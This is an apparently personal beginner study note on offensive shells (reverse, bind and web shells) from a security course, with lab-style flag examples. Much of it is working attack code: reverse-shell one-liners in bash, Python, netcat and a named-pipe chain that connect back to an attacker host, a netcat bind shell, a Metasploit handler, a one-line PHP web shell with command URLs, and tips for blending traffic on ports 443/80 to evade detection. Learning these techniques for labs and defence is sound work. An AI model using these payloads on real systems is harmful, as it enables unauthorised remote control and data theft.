# Shells Overview
**Path:** CyberSec_101 - Offensive Security Tooling
**Date:** 2026-03-17
**Difficulty:** Easy

---

## Three Types of Shells
```
Reverse Shell → target connects BACK to you
Bind Shell    → you connect TO the target
Web Shell     → shell via browser through uploaded file
```

---

## Reverse Shell

- Target machine initiates connection back to attacker
- Attacker sets up listener first then triggers exploit
- Bypasses firewalls because target makes outgoing connection
- Most commonly used in real attacks
```
You (listener) ←——connects back—— Target (exploited)
```

**Attacker runs first:**
```bash
nc -lvnp 4444
```

**Payload injected on target:**
```bash
# Bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Named pipe (most reliable)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc YOUR_IP 4444 >/tmp/f

# Python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Netcat
nc YOUR_IP 4444 -e /bin/bash
```

---

## Bind Shell

- Target opens a port and waits for attacker to connect
- Attacker connects to that open port after exploit
- Less common — firewalls usually block incoming connections
```
You ——connects to open port——> Target (listening)
```

**Target runs (via exploit):**
```bash
nc -lvnp 4444 -e /bin/bash
```

**Attacker connects:**
```bash
nc TARGET_IP 4444
```

---

## Shell Listeners

Netcat is the primary listener tool:
```bash
nc -lvnp 4444
# -l = listen
# -v = verbose output
# -n = no DNS resolution
# -p = port number
```

Metasploit listener (more stable):
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run
```

---

## Shell Payloads

Use **revshells.com** — generates any payload instantly:
- Enter your IP and port
- Select shell type
- Copy and use

**Which payload to try first:**
```
Linux target  → bash first → python → named pipe → nc
Windows target → powershell first → python
PHP server    → PHP payload
```

**Port choice:**
- 4444 → standard practice for labs
- 443 or 80 → use in real engagements to blend with normal traffic
- Any port 1024-65535 works

---

## Web Shell

- PHP file uploaded to target web server
- Execute commands via browser URL
- Used when file upload vulnerability exists

**Simple PHP web shell:**
```php
<?php system($_GET["cmd"]); ?>
```

**Usage after uploading shell.php:**
```
http://target.com/uploads/shell.php?cmd=whoami
http://target.com/uploads/shell.php?cmd=ls /
http://target.com/uploads/shell.php?cmd=cat /flag.txt
```

**Upgrade web shell to reverse shell:**
```
http://target.com/uploads/shell.php?cmd=bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

---

## Named Pipe Payload Explained
```bash
rm -f /tmp/f        # delete existing pipe file
mkfifo /tmp/f       # create named pipe
cat /tmp/f          # read from pipe continuously
| sh -i 2>&1        # pipe into interactive shell
| nc YOUR_IP 4444   # send output to your listener
>/tmp/f             # feed your input back into pipe
```
Creates two-way communication channel between you and target.

---

## Practical Flow
```
1. Start listener → nc -lvnp 4444
2. Inject/deliver payload to target
3. Target connects back to your listener
4. You have shell → cd / → ls → cat flag.txt
```

---

## Gotchas / Surprises

- Always start listener BEFORE triggering the payload
- If bash payload fails try named pipe — works on almost all Linux
- Web shell uploads go to /uploads/ or /images/ usually
- Port 4444 is flagged by IDS in real environments
- Reverse shell is preferred over bind shell in most scenarios
- sh: cant access tty error is normal — shell still works

---

## My Understanding in Plain English

A shell gives you command execution on a target.
Reverse shell = target calls you back.
Bind shell = you call the target.
Web shell = you execute commands through a browser.
Always use revshells.com for payloads —
never try to memorize them.

---

## Related Notes

- [[Metasploit Meterpreter]]
- [[Gobuster Basics]]
- [[Web Application Basics]]
- [[Msfvenom]]
